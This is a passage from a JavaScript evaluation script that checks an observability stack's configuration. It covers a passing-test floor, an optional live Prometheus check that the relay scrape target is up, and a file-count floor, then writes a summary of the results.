          `G9k: ${summary.pass} passing tests, floor ${NODE_TEST_PASS_FLOOR} — a suite that ` +
            'stopped running is indistinguishable from a suite that passed unless the count is ' +
            'checked (re-derive the floor with the grep in this file if tests were removed on ' +
            'purpose)',
        );
      }
    }
  }

  // --- L2 (MR_OBS_STACK=1): the LIVE criterion-level proof of OBS-46 --------
  // The static half proves the job, the port and the rule are WRITTEN. Only
  // this proves Prometheus actually scrapes the relay successfully — i.e. that
  // /health answers with a body Prometheus can PARSE. A 200 carrying `ok`, or a
  // `204 No Content`, both yield `up=0` (measured against prom/prometheus:
  // v3.13.2), which pins the dead-man's switch permanently firing while every
  // gate above stays green. L1 (`GET /health` -> 200) is deliberately NOT run:
  // it is strictly implied by a target reporting `health: "up"`.
  //
  // The skip is STATED, never silent (the metrics-contract eval's idiom).
  let liveNote =
    'L2 skipped by design (MR_OBS_STACK != 1: a booted compose stack is a separate ' +
    'precondition); every static gate above ran unconditionally';
  if (process.env.MR_OBS_STACK === '1') {
    // SEAM, live half only, and MANDATORY rather than optional: Docker Desktop
    // scopes `network_mode: host` to its own VM, so the stack's loopback
    // endpoints are unreachable from WSL-native Node. MR_OBS_PROM_FETCH supplies
    // an argv vector that CAN reach them (e.g. a `docker run --network host`
    // curl); the real single-box deployment needs no override and keeps the
    // in-process fetch. It is a JSON ARGV ARRAY — never a shell string.
    const targetsUrl = ['http', ':', '//', '127.0.0.1:9090', '/api/v1/targets'].join('');
    let fetchArgv = null;
    let seamBroken = false;
    const rawFetchArgv = process.env.MR_OBS_PROM_FETCH;
    if (rawFetchArgv !== undefined && rawFetchArgv.trim().length > 0) {
      let parsedArgv;
      let parsedOk = true;
      try {
        parsedArgv = JSON.parse(rawFetchArgv);
      } catch (e) {
        parsedOk = false;
        seamBroken = true;
        failures.push(
          'LIVE L2: MR_OBS_PROM_FETCH is set but does not parse as JSON ' +
            `(${e?.message ?? String(e)}). It must be a JSON ARGV ARRAY, never a shell string.`,
        );
      }
      if (parsedOk) {
        const isArgv =
          Array.isArray(parsedArgv) &&
          parsedArgv.length > 0 &&
          parsedArgv.every((a) => typeof a === 'string' && a.length > 0);
        if (!isArgv) {
          seamBroken = true;
          failures.push(
            'LIVE L2: MR_OBS_PROM_FETCH must be a JSON array of one or more non-empty strings ' +
              '(argv[0] plus its arguments; the targets URL is appended by this eval). A shell ' +
              'string is never accepted, and a misconfigured seam must not silently fall back ' +
              'to an in-process fetch that cannot reach the Docker Desktop VM anyway.',
          );
        } else {
          fetchArgv = parsedArgv;
        }
      }
    }

    let body = null;
    try {
      if (seamBroken) throw new Error('the MR_OBS_PROM_FETCH seam is misconfigured (see above)');
      if (fetchArgv === null) {
        const res = await fetch(targetsUrl);
        if (!res.ok) throw new Error(`GET /api/v1/targets returned HTTP ${res.status}`);
        body = await res.text();
      } else {
        const run = spawnSync(fetchArgv[0], [...fetchArgv.slice(1), targetsUrl], {
          encoding: 'utf8',
          stdio: 'pipe',
          timeout: 30_000,
          maxBuffer: 32 * 1024 * 1024,
        });
        if (run.error !== undefined && run.error !== null) {
          throw new Error(
            `MR_OBS_PROM_FETCH '${fetchArgv[0]}' failed to spawn — ${run.error.message}`,
          );
        }
        if (run.status !== 0) {
          throw new Error(
            `MR_OBS_PROM_FETCH exited ${run.status}: ${`${run.stderr ?? ''}`.trim().slice(0, 200)}`,
          );
        }
        body = run.stdout ?? '';
        if (body.trim().length === 0) {
          throw new Error(
            'MR_OBS_PROM_FETCH produced EMPTY stdout — an unread endpoint is not an absent target',
          );
        }
      }
    } catch (e) {
      body = null;
      failures.push(
        `LIVE L2: could not read Prometheus's target list — ${e?.message ?? String(e)}`,
      );
    }

    if (body !== null) {
      let parsed = null;
      try {
        parsed = JSON.parse(body);
      } catch (e) {
        failures.push(`LIVE L2: /api/v1/targets did not return JSON (${e?.message ?? String(e)})`);
      }
      const active = parsed?.data?.activeTargets;
      if (!Array.isArray(active) || active.length === 0) {
        if (parsed !== null) {
          failures.push(
            'LIVE L2: /api/v1/targets reported ZERO active targets — an empty list is not a ' +
              'healthy stack, and it would make the clause below vacuous',
          );
        }
      } else {
        const relayTargets = active.filter((t) => t?.labels?.job === RELAY_SERVICE_NAME);
        if (relayTargets.length !== 1) {
          failures.push(
            `LIVE L2 (OBS-46): Prometheus reports ${relayTargets.length} active targets with ` +
              `job="${RELAY_SERVICE_NAME}"; exactly 1 is expected. Jobs seen: ` +
              `[${[...new Set(active.map((t) => t?.labels?.job))].join(', ')}]. The static G9o ` +
              'gate proves the job is WRITTEN; only this proves Prometheus loaded it.',
          );
        } else if (relayTargets[0].health !== 'up') {
          failures.push(
            `LIVE L2 (OBS-46): the \`${RELAY_SERVICE_NAME}\` target reports health ` +
              `\`${relayTargets[0].health}\` (lastError: ` +
              `${JSON.stringify(relayTargets[0].lastError ?? '')}). This is the ONE check that ` +
              'catches a /health body Prometheus cannot parse: a 200 whose body is `ok`, and a ' +
              '204 No Content, BOTH scrape to up=0 while every static gate stays green — and ' +
              "up=0 pins the dead-man's switch permanently firing, which is precisely the " +
              'failure the m20e-2 park warned about. Serve a valid exposition document (the ' +
              'label-free ' +
              '`mr_trace_relay_lines_read_total` counter).',
          );
        } else {
          liveNote =
            `L2 LIVE: Prometheus reports the \`${RELAY_SERVICE_NAME}\` target ` +
            `\`${relayTargets[0].scrapeUrl ?? '(url unknown)'}\` as health="up" among ` +
            `${active.length} active targets`;
        }
      }
    }
  }

  // --- T-g: non-vacuity floor ----------------------------------------------
  if (READ_FILES.size < FILE_FLOOR) {
    failures.push(
      `T-g: only ${READ_FILES.size} real files were read, floor ${FILE_FLOOR} — a scan that ` +
        'reads less than it claims is a scan that proves less than it claims',
    );
  }

  if (failures.length > 0) {
    return { name: NAME, pass: false, detail: failures.join(' || ') };
  }
  return {
    name: NAME,
    pass: true,
    detail:
      `C1-C18 pass against ${READ_FILES.size} real files; G9a/G9b both correlation directions; ` +
      `G9c connection_id is no label; G9d read ${membership?.length ?? 0} member(s) positively; ` +
      `G9e clear of movement_tick + ${sloSet.names?.length ?? 0} $slo_set names + ` +
      `${benches.ids?.length ?? 0} bench ids; G9f exact set equality over ${scan.reducersScanned} ` +
      `reducer bodies in ${Object.keys(srcMap).length} files; G9h no supersession due; ` +
      `G9i/G9j ${RELAY_PRODUCTION_FILES.length} relay production files clean and every relay ` +
      `.mjs in exactly one of ${RELAY_BAN_TIERS.length} ban tiers (the DAEMON tier's egress ban ` +
      "is the P5-otlp-export tripwire); G9n the relay mounts alloy's own replicas path read-only and " +
      `accepts exactly [${RELAY_COMMAND_FLAGS.join(', ')}] with no entrypoint/env_file/` +
      'environment; G9o its scrape job resolves inside scrape_configs: on /health at the port ' +
      "its own compose block binds; G9p its dead-man's switch is distinct from AlloyDown, not " +
      "paused, and mirrors AlloyDown's threshold, datasource, severity and `for:` — all DERIVED " +
      `from that rule; G9k ${NODE_TEST_FILES.length} suites green (floor ` +
      `${NODE_TEST_PASS_FLOOR}); G12a the tempo park is pinned and VISIBLE (command list exact ` +
      `and in order, image tag ${TEMPO_IMAGE_TAG}, no profiles/extends, restart unless-stopped); ` +
      `G12b ${alertingDocs.length} provisioned alerting document(s), every group interval ` +
      `non-zero and 10s-divisible under ${GRAFANA_IMAGE_TAG} with every \`for:\` an exact ` +
      'multiple of its own group interval; G12c the Dockerfile final stage strips the caddy ' +
      'net-bind capability as the last writer of that path, before its single USER; G12d the ' +
      `alloy block declares only the ${ALLOY_ALLOWED_KEYS.length} allowlisted keys and runs ` +
      "non-root, cap-dropped; G12e s4_keep's OWN statements list carries the key allowlist at " +
      `[0] plus all three pinned value bounds, and no compose override file exists; G13a the ` +
      `mr-scheduler group's numerator/denominator selectors agree on the same 4-name ` +
      `[${SCHEDULED_FN_NAMES.join(', ')}] allowlist with no reducer= harmonisation trap and the ` +
      'ratio rule derives without a third matcher; G13b the dashboard panel is unique, ' +
      "non-overlapping, unit percentunit and its threshold equals the alert's own param; G13c " +
      "the ScheduledFunctionDelayed alert is warning/not-paused/noDataState OK with a `for:` " +
      "DERIVED as a multiple of its group interval and strictly greater than the recorded 5m " +
      'rate window; G13d the alert param and panel threshold are the SAME number and the ' +
      `on-time \`le=\` sits on the measured bucket lattice; G13e the numbered-provenance block ` +
      `names 30ms as SpacetimeDB's own log::warn! threshold, not a bucket edge; ${liveNote}`,
  };
}

export default observabilityStackConfigEval;

// ---------------------------------------------------------------------------
// Main-guard: `node evals/observability-stack-config.eval.mjs` runs it alone.
// ---------------------------------------------------------------------------
if (path.resolve(process.argv[1] ?? '') === fileURLToPath(import.meta.url)) {
  const result = await (async () => {
    try {
      return await observabilityStackConfigEval();
    } catch (e) {
      return {
        name: 'observability-stack-config',
        pass: false,
        detail: `threw: ${e?.message ?? String(e)}`,
      };
    }
  })();
  console.log(
    `eval ${result.pass ? 'PASS' : 'FAIL'}: ${result.name}${result.detail ? ` — ${result.detail}` : ''}`,
  );
  process.exit(result.pass ? 0 : 1);
}

